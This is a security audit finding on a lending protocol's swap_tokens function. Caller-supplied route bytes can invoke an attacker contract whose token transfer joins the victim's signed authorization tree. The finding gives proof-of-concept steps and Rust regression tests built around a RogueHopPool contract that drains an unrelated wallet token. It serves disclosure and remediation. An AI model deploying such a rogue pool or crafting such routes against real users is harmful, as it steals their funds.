### Title
Arbitrary route-selected contracts can attach unauthorized wallet drains to strategy authorization trees - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_tokens` accepts caller-supplied route bytes and invokes the configured swap router while the account owner’s authorization for the enclosing strategy remains active. Because the controller validates only the measured input spend and positive output receipt, a route can invoke an attacker-controlled contract that requests a separate `token.transfer(victim, attacker, amount)` authorization from the caller. The transfer is recorded as a child of the caller’s strategy authorization and executes if the caller signs the simulated authorization tree.

### Finding Description
The affected path is reachable through `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply`, all of which funnel arbitrary `swap: Bytes` into `swap_tokens`. That function snapshots the input and output balances, authorizes only the intended input transfer, invokes `router.execute_strategy(&controller, &amount_in, swap)`, and then verifies that the controller did not overspend and received positive output. [1](#0-0) 

These checks validate the route’s accounting result, not the destinations or contract calls reachable through the encoded route. A router hop can therefore invoke attacker-controlled code under the caller’s root authorization. The regression test demonstrates this exact behavior: `RogueHopPool::swap` transfers an unrelated token from the victim to the attacker, simulation records that transfer as a child of `swap_collateral`, and signing that tree allows the theft while the expected collateral swap still succeeds. [2](#0-1) [3](#0-2) 

The token balances checked by the controller remain consistent, so `RouterOverspend`, `NoSwapOutput`, account risk checks, and the flash guard do not detect the unrelated wallet transfer. [4](#0-3) 

### Impact Explanation
An attacker can steal arbitrary tokens held by the victim, including tokens unrelated to the lending position, by convincing the victim to execute a crafted strategy route and sign the authorization tree returned by simulation. The victim’s collateral conversion can appear economically correct while an unrelated transfer drains their wallet.

This is theft of user funds by an unprivileged attacker-provided route. It does not require privileged access, a leaked key, a protocol upgrade, or control of the configured router contract.

### Likelihood Explanation
Exploitation requires victim interaction: the victim must submit a malicious route and sign the expanded authorization tree containing the unexpected transfer. Route bytes are opaque and simulation may surface the extra authorization only as an authorization child, making this practical against users who verify quoted output rather than decoding every invoked contract and authorization subtree.

The controller’s measured balance checks make the malicious route look successful, increasing the chance that clients treat it as a valid swap. The attack does not depend on oracle manipulation, MEV, or collateral price movement.

### Recommendation
Restrict route execution to explicitly allowlisted venues or prevent route-controlled contracts from being invoked inside the caller’s authorization scope. At minimum:

- Decode and validate every route destination before invocation.
- Permit only known pool or venue contracts.
- Require simulation clients to reject authorization trees containing anything other than the expected input transfer.
- Surface and compare the complete authorization tree before signing.
- Consider separating strategy authorization from arbitrary wallet-token authorization so unrelated `require_auth` calls cannot attach to the strategy root.

### Proof of Concept
1. Victim owns a debt-free account with USDC collateral and also holds an unrelated token that is not listed by the lending protocol.
2. Attacker deploys a contract exposing a `swap` function that calls `token.transfer(victim, attacker, victim_balance)` on the unrelated token.
3. Attacker supplies route bytes whose hop destination is that contract, while the route otherwise produces the expected output asset.
4. Victim invokes:

```rust
controller.swap_collateral(
    victim,
    account_id,
    usdc_hub_asset,
    swap_amount,
    eth_hub_asset,
    malicious_route,
)
```

5. `swap_tokens` invokes the router with the attacker-controlled route and later accepts the call because input spend is bounded and ETH output is positive. [5](#0-4) 
6. During the route, the attacker contract requests `token.transfer(victim, attacker, victim_balance)`. Simulation records it beneath the victim’s `swap_collateral` authorization. [6](#0-5) 
7. If the victim signs the returned tree, the unrelated token moves to the attacker and the strategy still deposits the expected ETH collateral. Signing a root-only tree causes the rogue transfer to fail, confirming that execution depends on attaching the malicious call to the strategy authorization rather than being independently authorized. [7](#0-6)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-55)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L230-269)
```rust
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```
